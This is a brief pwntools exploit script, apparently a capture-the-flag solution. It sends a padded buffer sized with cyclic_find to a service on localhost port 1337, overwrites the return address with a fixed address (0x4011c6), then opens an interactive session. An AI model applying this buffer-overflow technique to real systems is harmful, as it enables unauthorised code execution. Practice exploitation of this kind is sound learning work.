from pwn import *

p = remote("localhost", 1337)

payload = b"A" * 60;
p.recvuntil(b": ")
p.sendline(payload)

payload = b"B" * cyclic_find(0x6161636161616161, n=8)
payload += p64(0x00000000004011c6)
p.recvuntil(b": ")
p.sendline(payload)

p.interactive()
